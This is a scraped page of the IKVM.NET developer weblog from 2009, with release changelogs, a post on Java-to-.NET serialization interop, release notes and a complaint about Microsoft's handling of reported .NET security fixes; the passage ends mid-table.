<P><A href="http://www.frijters.net/swing1.png"><IMG border=0 alt="Click for full size" src="http://www.frijters.net/swing1.png" width="30%"></A> <A href="http://www.frijters.net/swing2.png"><IMG border=0 alt="Click for full size" src="http://www.frijters.net/swing2.png" width="30%"></A> <A href="http://www.frijters.net/swing3.png"><IMG border=0 alt="Click for full size" src="http://www.frijters.net/swing3.png" width="30%"></A> </P>
<P>Note that this is running the OpenJDK Swing code, with the GNU Classpath code the source code view and the HTML tab (the blue "Bouncing Babies!" text is HTML rendered in the tab) never worked. So this is great progress, but a lot more is still needed. Keyboard (and focus) support is still lacking and font support is still fairly limited, for example.</P>
<P>Changes:</P>
<UL>
<LI>More AWT/Swing work by Volker Berlin and Nat Luengnaruemitchai.</LI>
<LI>Fixed detection of dynamic assemblies (at runtime).</LI>
<LI>Fixed NullReferenceException when getting annotations on delegate constructor for delegates defined in Java.</LI>
<LI>Added App.config setting (ikvm-emit-symbols) to force emitting debug symbols on or off.</LI>
<LI>Fixed regression introduced in 0.40 that caused ikvmc to crash when specifying a non-public custom class loader.</LI>
<LI>Fixed bug in the handling of Annotation.__ReturnValue and Annotation.__Multiple fake types.</LI>
<LI>Implemented automatic .NET serialization support for Java serializable type (see <A HREF="/PermaLink.aspx?guid=180f68e5-477e-4ad6-a41a-c7d58b7ff28a">here</A> for details).</LI>
<LI>Fix for #<A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=2829717&amp;group_id=69637&amp;atid=525264">2829717</A>. Constructing java.lang.String instances from JNI should redirect to static helper method.</LI>
<LI>Several minor IKVM.Reflection.Emit fixes.</LI>
<LI>Added ILGenerator.__GetILOffset().</LI>
<LI>Changed CodeEmitter to use ILGenerator.__GetILOffset() (when usig IKVM.Reflection.Emit) instead of manually tracking the IL offset.</LI>
<LI>Added "clever" exception block assistance mode to ILGenerator. In this mode, leave and endfinally instructions are only auto inserted when necessary.</LI>
<LI>Use ILGenerator's new "clever" mode in ikvmc to produce smaller code.</LI>
<LI>Fixed IKVM.Reflection.Emit to put .pdb file in same location as assembly (instead of current directory). Thanks to Dawid Weiss for reporting this.</LI>
<LI>Removed ISymWrapper.dll dependency from IKVM.Reflection.Emit.PdbWriter.dll.</LI>
<LI>IKVM.Reflection.Emit.PdbWriter.dll now caches the debugging information, instead of "streaming" it into the unmanged PDB writer to workaround the ridiculous memory usage of the unmanaged PDB writer. It is now possible to build the full core class library assemblies set with debugging enabled.</LI>
<LI>Fixed major regression in pdb debugging support introduced in 0.40 that caused local variable support to be completely broken.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.41.3524.zip">ikvmbin-0.41.3524.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/25/2009 09:21:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=679704a5-3310-46d7-a4c4-3dcfac73cccd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=679704a5-3310-46d7-a4c4-3dcfac73cccd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 24 August 2009</h2></div>
<div class="newsItems"><a name="ae9570bad-eec2-4322-a596-0521594e5384"></a><div class="entry">
	<h3 class="entryTitle">Microsoft PDC</h3>
	<div class="entryBody">
		<P>If you're going to the PDC and want to chat, <A href="mailto:jeroen@frijters.net&amp;subject=PDC%20Meetup">let me know</A>.</P>
<P><A href="mailto:jeroen@frijters.net&amp;subject=PDC%20Meetup"><IMG border=0 alt="Meet me in Los Angeles -- PDC 2009" src="http://www.frijters.net/pdc09.jpg"></A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/24/2009 06:23:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e9570bad-eec2-4322-a596-0521594e5384"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e9570bad-eec2-4322-a596-0521594e5384">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 11 August 2009</h2></div>
<div class="newsItems"><a name="a180f68e5-477e-4ad6-a41a-c7d58b7ff28a"></a><div class="entry">
	<h3 class="entryTitle">Serialization Interop</h3>
	<div class="entryBody">
		<P>I'm not a big fan of serialization, but there is one use that makes sense to me; intra-process, cross-AppDomain serialization. If you have ever done any cross-AppDomain work with IKVM you've probably run into the situation where a Java exception couldn't be serialized across the AppDomain boundary.</P>
<P>I've finally addressed this by building automatic (oneway) serialization interop support into IKVM. This means that most Java classes that are serializable should now automatically become .NET serializable. There are, however, some important caveats:</P>
<UL>
<LI>Serialized streams will not be compatible between different IKVM releases. This is intended *only* for cross-AppDomain serialization between different instances of the same IKVM code.</LI>
<LI><A href="http://java.sun.com/javase/6/docs/api/java/io/ObjectOutputStream.html#writeUnshared(java.lang.Object)">ObjectOutputStream.writeUnshared()</A> and <A href="http://java.sun.com/javase/6/docs/api/java/io/ObjectInputStream.html#readUnshared()">ObjectInputStream.readUnshared()</A> have not been implemented. So any classes that rely on those will fail to serialize/deserialize.</LI>
<LI>Instances of dynamically loaded Java classes and statically (ikvmc) compiled classes that implement <A href="http://java.sun.com/javase/6/docs/api/java/io/Serializable.html">readResolve()</A> will fail deserialization if they (directly or indirectly) serialize self references.</LI>
<LI>Deserialization ordering may be different, meaning that if a class has a custom deserialization method, it may encounter objects that have not been completely deserialized.</LI>
<LI>Under some circumstances, a class that implements readResolve() may have its readResolve() method called twice on the same object.</LI>
<LI>When a <A HREF="/CommentView.aspx?guid=4a4bcc69-174f-40af-bb16-85227b87acc0">ghost array</A> is serialized, it is serialized as an object[] (i.e. it loses its specific type).</LI></UL>
<P>Again, any Java class that is serializable (i.e. that implements java.io.Serializable or java.io.Externalizable and follows the associated rules) is generally automatically .NET serializable. There are a couple of exceptions where ikvmc and the runtime will assume that your class wants to handle its own .NET serialization:</P>
<UL>
<LI>If the class has the @cli.System.<A href="http://msdn.microsoft.com/en-us/library/system.serializableattribute.aspx">SerializableAttribute</A>.Annotation annotation.</LI>
<LI>If the class (or one of its base classes) implements cli.System.Runtime.Serialization.<A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.iserializable.aspx">ISerializable</A>.</LI>
<LI>If the class (or one of its base classes) implements cli.System.Runtime.Serialization.<A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.iobjectreference.aspx">IObjectReference</A>.</LI>
<LI>If the class has a <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.iserializable.getobjectdata.aspx">GetObjectData</A> method.</LI>
<LI>If the class has a <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.iserializable.aspx">.NET deserialization constructor</A>.</LI></UL>
<P>Using the .NET custom serialization custom attributes <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.ondeserializedattribute.aspx">OnDeserializedAttribute</A>, <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.ondeserializingattribute.aspx">OnDeserializingAttribute</A>, <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.onserializedattribute.aspx">OnSerializedAttribute</A> or <A href="http://msdn.microsoft.com/en-us/library/system.runtime.serialization.onserializingattribute.aspx">OnSerializingAttribute</A> does not interfere with getting automatic serialization support (and the .NET serialization engine will call the annotated methods at the appropriate times).</P>
<P><B>Inheritance - Extending Java classes in .NET</B></P>
<P>When you want to subclass a serializable Java class in (e.g.) C# and make your subclass serializable as well, you need to do two simple things:</P>
<OL>
<LI>Add a [Serializable] attribute to your class.</LI>
<LI>Add a .NET deserialization constructor that calls the base class constructor and does nothing else.</LI></OL>
<P>Here's an example of extending java.util.ArrayList:</P>
<P><CODE>[<FONT color=#2b91af>Serializable</FONT>]<BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>MyList</FONT> : java.util.<FONT color=#2b91af>ArrayList</FONT><BR>{<BR><FONT color=#0000ff>&nbsp; private</FONT> <FONT color=#0000ff>int</FONT> exampleField;<BR><BR><FONT color=#0000ff>&nbsp; public</FONT> MyList()<BR>&nbsp; {<BR>&nbsp; }<BR><BR><FONT color=#0000ff>&nbsp; protected</FONT> MyList(<FONT color=#2b91af>SerializationInfo</FONT> info, <FONT color=#2b91af>StreamingContext</FONT> context)<BR>&nbsp;&nbsp;&nbsp; : <FONT color=#0000ff>base</FONT>(info, context)<BR>&nbsp; {<BR>&nbsp; }<BR>}</CODE></P>
<P>MyList is now .NET serializable and exampleField will automatically be serialized/deserialized.</P>
<P><B>Inheritance - Extending .NET classes in Java</B></P>
<P>For this scenario, nothing has really changed. You still need to follow the standard .NET rules for creating serializable types.</P>
<P><B>Serializing .NET objects in Java</B></P>
<P>The automatic serialization interop is only one way, so you won't be able to serialize .NET objects using Java serialization (unless they happen to implement java.io.Serializable.__Interface or java.io.Externalizable). I currently have no plans to implement this functionality.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/11/2009 09:24:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=180f68e5-477e-4ad6-a41a-c7d58b7ff28a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=180f68e5-477e-4ad6-a41a-c7d58b7ff28a">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 31 July 2009</h2></div>
<div class="newsItems"><a name="ad632ac99-da74-4cca-8d23-28ef825a1320"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.40 Update 1 Release Candidate 1</h3>
	<div class="entryBody">
		<P>Another minor update.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.40.0.3</LI>
<LI>Fixed regression introduced in 0.40 that caused ikvmc -classloader:&lt;class&gt; option to fail if &lt;class&gt; wasn't public.</LI>
<LI>Fixed regression introduced in 0.40 that caused ikvmstub on core class libraries to fail.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=2829717&amp;group_id=69637&amp;atid=525264">#2829717</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.40.0.3.zip">ikvmbin-0.40.0.3.zip</A>.<BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.40.0.3.zip">ikvm-0.40.0.3.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped-IKVM-0.40.zip">openjdk6-b12-stripped-IKVM-0.40.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/31/2009 08:50:46 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d632ac99-da74-4cca-8d23-28ef825a1320"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d632ac99-da74-4cca-8d23-28ef825a1320">Comments [10]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 17 July 2009</h2></div>
<div class="newsItems"><a name="ac7e7d775-47e1-4525-9652-4ceea7a4a0d8"></a><div class="entry">
	<h3 class="entryTitle">Responsible Disclosure, Irresponsible Patching?</h3>
	<div class="entryBody">
		<P>In <A href="/CommentView.aspx?guid=3b9e044f-673d-462b-a16e-222a862f1df3">December 2006</A> I reported a critical .NET security vulnerability to Microsoft. When I found the the issue it had already been fixed in Vista, but it still took them until <A href="http://www.microsoft.com/technet/security/Bulletin/MS07-040.mspx">July 2007</A> to release a fix for XP. Seven months, I thought that was pretty bad.</P>
<P>In <A href="/PermaLink.aspx?guid=e548c92d-42f7-4691-8b76-83adc59001f8">September 2008</A> I reported another critical .NET security vulnerability to Microsoft. The fix for this issue was trivial and made it into the subsequent <A href="http://www.microsoft.com/presspass/press/2008/oct08/10-13Silverlight2PR.mspx">Silverlight 2.0 RTM</A> on October 13th. This week the July patches were released and for the tenth month no security bulletin about this issue.</P>
<P>Wednesday I mailed the Microsoft Security Response Center to ask what the status is. I received no reply.</P>
<P>So I decided to investigate. I quickly discovered that my main (Vista) system was already patched (!). After some digging I found that on XP, Windows Update offers <A href="http://support.microsoft.com/kb/951847">KB951847</A> which contains a fix.</P>
<P>The KB article makes no mention of any security fixes, nor is there a corresponding security bulletin.</P>
<P>If this is Microsoft's idea of responsible disclosure, then maybe I should also apply my "no Microsoft bug filing" policy to security issues.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/17/2009 10:37:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c7e7d775-47e1-4525-9652-4ceea7a4a0d8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c7e7d775-47e1-4525-9652-4ceea7a4a0d8">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 16 July 2009</h2></div>
<div class="newsItems"><a name="a19fb3a20-0a7c-4b47-a76c-a88d1e69f416"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>It's been a while since the previous snapshot, but I haven't been sitting around idle. Besides the fixes to IKVM.Reflection.Emit, which were part of secret prototype project I've been working on (and may or may not announce at some point in the future :-)), I've also been working on IKVM.NET itself.</P>
<P>I did a bunch of work to improve startup (at least for "core" classes). In particular, many scenarios should now be possible without initializing the reflection machinery.</P>
<P>Here are some examples:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD colSpan=2>
<P align=center>IKVM 0.40</P></TD>
<TD colSpan=3>
<P align=center>IKVM 0.41.3484</P></TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>
<P align=right>&nbsp;&nbsp;&nbsp; x86 JIT</P></TD>
<TD>
<P align=right>&nbsp;&nbsp;&nbsp; x86 NGEN</P></TD>
<TD>
<P align=right>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x86 JIT</P></TD>
<TD>
<P align=right>&nbsp;&nbsp;&nbsp; x86 NGEN</P></TD>
<TD>
<P align=right>&nbsp;&nbsp;&nbsp; 2nd invocation</P></TD></TR>
<TR>
<TD>obj = Float.TYPE</TD>
<TD align=right>12.4</TD>
<TD align=right>1.56</TD>
<TD align=right>0.280</TD>
<TD align=right>0.0152</TD>
<TD align=right>0.0041</TD></TR>
<TR>
<TD>System.out.println("Hello World")</TD>
<TD align=right>275</TD>
<TD align=right>12.8</TD>
<TD align=right>114</TD>
<TD align=right>8.90</TD>
<TD align=right>0.0569</TD></TR>
<TR>
<TD>new StringBuffer()</TD>
<TD align=right>129</TD>
<TD align=right>10.8</TD>
<TD align=right>6.34</TD>
<TD align=right>0.0866</TD>
<TD align=right>0.0041</TD></TR>
<TR>
<TD>Charset.forName("windows-1252")</TD>
<TD align=right>267</TD>
<TD align=right>13.7</TD>
<TD align=right>77.4</TD>
<TD align=right>7.87</TD>
<TD align=right>0.0028</TD></TR></TBODY></TABLE>
<P><BR>Times are in milliseconds and (except for the last column) show the time it takes to execute the code snippet on the left as the very first Java code in the process. I added the "2nd invocation" column to emphasize that these large times are due to JIT and/or initialization costs. Things have clearly improved, but it should also be clear that when you care about startup time, you really need to look into using <A href="http://msdn.microsoft.com/en-us/library/6t9t5wcf(VS.80).aspx">NGEN</A>.</P>
<P>I should point out that currently only the "windows-1252" (and UTF-8) charsets are eagerly constructed to avoid reflection, if you care about another charset, let me know and I will add it (unless your charset isn't in IKVM.OpenJDK.Core.dll, then you're out of luck.)</P>
<P>Changes:</P>
<UL>
<LI>More AWT/Swing work.. 
<LI>Removed more GNU Classpath remnants. 
<LI>Added rmi stub generation to build process, instead of relying on .class files in stripped zip. 
<LI>Added "RuntimeCompatibilityAttribute(WrapNonExceptionThrows = true)" to generated assemblies. 
<LI>Added ikvmc warnings for VerificationError and ClassFormatError. 
<LI>Added -baseaddress:&lt;address&gt; option to ikvmc. 
<LI>Fixed ikvmc to skip empty lines in response file, instead of throwing an exception. 
<LI>Split XML assembly into eight parts. Thanks to Michael Kay for helping out with this. 
<LI>Changed build to put x86 specific binaries in bin-x86 directory and x64 specific binaries in bin-x64. jvm.dll is now always built in both flavors. Unfortunately, ikvm-native still needs to be built separately. 
<LI>Split core library into several more assemblies. 
<LI>Added step to build process to automatically compute a base address for core library assemblies. This should make ngen-ed images more efficient (if the images can be loaded at their preferred base addresses). 
<LI>Added a mechanism to the build to prevent accidentally introducing new dependencies between the OpenJDK assemblies. 
<LI>Fixed bug that caused startup properties set with ikvm.runtime.Startup.setProperties() to be forgotten when doing a System.setProperties(null). 
<LI>Forked java.io.ObjectStreamField to make signature computation lazy. 
<LI>Made ikvm.runtime.Util.getInstanceTypeFromClass() into an instrinsic, when used with a class literal. 
<LI>Optimized class literals that reference statically compiled classes (at a slight cost to dynamically compiled classes). 
<LI>Optimized primitive class literals. 
<LI>Added codegen optimization for reading unsigned bytes from a byte array (buf[i] &amp; 0xFF or buf[i] 0x0FFL). 
<LI>Made callerID initialization lazy. 
<LI>Forked sun/nio/cs/StandardCharsets.java to eagerly create MS1252 and UTF-8 charsets, to avoid reflection (at least in Western Europe, if you want another charset added, just let me know.) 
<LI>Several other minor optimizations.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.41.3484.zip">ikvmbin-0.41.3484.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/16/2009 10:00:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=19fb3a20-0a7c-4b47-a76c-a88d1e69f416"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=19fb3a20-0a7c-4b47-a76c-a88d1e69f416">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 26 June 2009</h2></div>
<div class="newsItems"><a name="a73837321-ce29-48da-9f12-e60b2b477c41"></a><div class="entry">
	<h3 class="entryTitle">IKVM.Reflection.Emit Update</h3>
	<div class="entryBody">
		<P>I&nbsp;have done a massive amount of fixes to IKVM.Reflection.Emit to make it full featured (even though it still doesn't implement all Reflection.Emit APIs, the functionality should (almost) all be there, for example via different overloads).</P>
<P>I completed support for generics (I think) and fixed many bugs in that area, ikvmc only uses a very small amount of generics so these fixes are unlikely to affect it.</P>
<P>It's worth explicitly stating the design goals of IKVM.Reflection.Emit:</P>
<UL>
<LI>It's a write-only API. Some GetXXX methods or properties may be implemented, but that's mostly for its internal convenience. 
<LI>There is intentionally no error checking. During ikvm development the error checking in System.Reflection.Emit has cost me a huge amount of time, it is generally much easier to diagnose the problem when you have a broken assembly file. PEverify and ILDASM are your friends. 
<LI>Code that uses System.Reflection.Emit in a write-only way is supposed to "just work" (modulo missing APIs, but those changes should be trivial).</LI></UL>
<P>I've done some pretty heavy duty testing on it. It should be ready for external (i.e. non-ikvmc) usage now. If you decide to use it (or consider using it), please let me know. As always, feedback is appreciated.</P>
<P>Changes:</P>
<UL>
<LI>Added support for ByRef and Pointer types. 
<LI>Completed support for all literal field constant types and fixed null literal fields. 
<LI>Added ModuleBuilder.DefineInitializedData(). 
<LI>Fixed many generics related bugs. 
<LI>Added a (non-standard) API to ModuleBuilder to set the PE image base address. 
<LI>Added TypeBuilder.SetParent(). 
<LI>Added TypeBuilder.GetMethod() and TypeBuilder.GetConstructor() to instantiate methods on generic types. 
<LI>Added a (non-standard) API to ILGenerator to disable the "helpful" automatic leave/endfinally instructions in exception blocks. 
<LI>Added support for pinned local variables. 
<LI>Added UIntPtr and TypedReference signature encodings. 
<LI>Fixed handling of TypeBuilder enums in custom attributes. 
<LI>Added MethodBuilder.SetSignature(). 
<LI>Added GenericTypeParameterBuilder.SetInterfaceConstraints() and .SetGenericParameterAttributes(). 
<LI>Fixed (Method|Type)Builder.SetCustomAttribute() to set HasSecurity flag when SuppressUnmanagedCodeSecurityAttribute is set. 
<LI>Added support for defining events.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvm-refemit-0.41.3464.zip">ikvm-refemit-0.41.3464.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/26/2009 06:42:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=73837321-ce29-48da-9f12-e60b2b477c41"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=73837321-ce29-48da-9f12-e60b2b477c41">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 15 June 2009</h2></div>
<div class="newsItems"><a name="a0ea23c36-48ea-4d34-a8d0-0c8d49376408"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.40 Update 1 Release Candidate 0</h3>
	<div class="entryBody">
		<P>A minor update.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.40.0.2</LI>
<LI>Changed build to generate rmi stubs instead of depend on .class files in openjdk6-b12-stripped-IKVM-0.40.zip. Thanks to Jo Shields for helping with this.</LI>
<LI>Fixed verifier bugs. Thanks to Brian Heineman for reporting this.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.40.0.2.zip">ikvmbin-0.40.0.2.zip</A>.</P>
<P>Sources: <A href="http://www.frijters.net/ikvm-0.40.0.2.zip">ikvm-0.40.0.2.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped-IKVM-0.40.zip">openjdk6-b12-stripped-IKVM-0.40.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/15/2009 07:40:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0ea23c36-48ea-4d34-a8d0-0c8d49376408"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0ea23c36-48ea-4d34-a8d0-0c8d49376408">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 05 June 2009</h2></div>
<div class="newsItems"><a name="a9aa75bec-7b19-47a0-abf2-a28756e5e080"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.40 Released</h3>
	<div class="entryBody">
		<P>I've <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM 0.40</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=926c9651-bb1c-49dd-9cc9-49157fc524f7">release candidate 1</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the known issues and incompatibilities.</P>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled in a single assembly fully obeys the JLS binary compatibility rules. 
<LI>An assembly can only contain one resource with a particular name. 
<LI>Passing incorrect command line options to ikvmc may result in an exception rather than a proper error messages.</LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 6 build 12. Below is a list of divergences and IKVM specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>GNU Classpath implementation with partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written, but there is no metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
